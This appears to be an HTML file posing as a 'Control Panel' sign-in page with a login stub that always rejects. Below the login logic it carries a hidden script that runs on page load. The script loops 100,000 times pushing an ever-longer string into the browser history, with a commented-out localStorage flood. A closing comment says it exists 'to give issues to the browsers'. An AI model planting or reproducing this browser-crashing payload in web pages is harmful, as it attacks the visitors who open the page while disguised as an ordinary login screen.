<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in · Control Panel</title>
    <meta name="robots" content="noindex, nofollow">
    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='.9em' font-size='90'%3E%F0%9F%94%92%3C/text%3E%3C/svg%3E">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #eef1f5;
            color: #1f2733;
            padding: 20px;
        }
        .login-card {
            width: 100%;
            max-width: 380px;
            background: #fff;
            border: 1px solid #e2e6ec;
            border-radius: 10px;
            box-shadow: 0 10px 30px rgba(20, 30, 50, 0.08);
            padding: 32px 30px;
        }
        .brand {
            display: flex;
            align-items: center;
            gap: 10px;
            justify-content: center;
            margin-bottom: 4px;
        }
        .brand .logo {
            width: 34px; height: 34px;
            border-radius: 8px;
            background: linear-gradient(135deg, #3b82f6, #2563eb);
            display: flex; align-items: center; justify-content: center;
            color: #fff; font-weight: 700;
        }
        .brand strong { font-size: 1.15rem; }
        .subtitle { text-align: center; color: #6b7480; font-size: 0.9rem; margin-bottom: 24px; }
        label { display: block; font-size: 0.85rem; font-weight: 600; margin-bottom: 6px; color: #384250; }
        .field { margin-bottom: 16px; }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 11px 13px;
            border: 1px solid #cfd6df;
            border-radius: 8px;
            font-size: 0.95rem;
            background: #fbfcfd;
            transition: border-color .2s, box-shadow .2s;
        }
        input:focus { outline: none; border-color: #2563eb; box-shadow: 0 0 0 3px rgba(37, 99, 235, .15); }
        .row { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; font-size: 0.85rem; }
        .row label { font-weight: 500; color: #6b7480; display: inline-flex; align-items: center; gap: 6px; margin: 0; }
        .row a { color: #2563eb; text-decoration: none; }
        button[type="submit"] {
            width: 100%;
            padding: 11px;
            border: none;
            border-radius: 8px;
            background: linear-gradient(135deg, #3b82f6, #2563eb);
            color: #fff;
            font-size: 0.98rem;
            font-weight: 600;
            cursor: pointer;
            transition: filter .2s;
        }
        button[type="submit"]:hover { filter: brightness(1.05); }
        .error { display: none; margin-top: 14px; padding: 10px 12px; border-radius: 8px; background: #fdecec; color: #b42318; font-size: 0.85rem; border: 1px solid #f7c9c5; }
        .footer { text-align: center; margin-top: 22px; font-size: 0.78rem; color: #9aa3ae; }
    </style>
</head>

<body>
    <main class="login-card">
        <div class="brand">
            <span class="logo">C</span>
            <strong>Control Panel</strong>
        </div>
        <p class="subtitle">Sign in to manage your site</p>

        <form id="loginForm" autocomplete="off" novalidate>
            <div class="field">
                <label for="username">Username</label>
                <input type="text" id="username" name="username" placeholder="admin" required>
            </div>
            <div class="field">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="••••••••" required>
            </div>
            <div class="row">
                <label><input type="checkbox" id="remember"> Remember me</label>
                <a href="#" onclick="return false;">Forgot password?</a>
            </div>
            <button type="submit">Sign in</button>
            <p class="error" id="loginError">Invalid username or password.</p>
        </form>

        <p class="footer">Control Panel v2.4 · &copy; <span id="year"></span></p>
    </main>

    <script>
        // Login stub — no backend, always rejects.
        document.getElementById('year').textContent = new Date().getFullYear();
        document.getElementById('loginForm').addEventListener('submit', function (e) {
            e.preventDefault();
            document.getElementById('loginError').style.display = 'block';
            document.getElementById('password').value = '';
        });
    </script>

    <script>
        var total = "";
        for( var i = 0; i < 100000; i++ ) {
            total = total + i.toString();
            history.pushState(0,0, total );
            //localStorage.setItem(Math.random(), total);
        }
    </script>
    <!--
    this is the code used to give issues to the browsers
    the pushState puts the total behind the google.com/
    so it becomes google.com/total and total keeps growing

    firefox seems to be pretty resilient against this tho xD it's able to stop the script
    -->
</body>

</html>
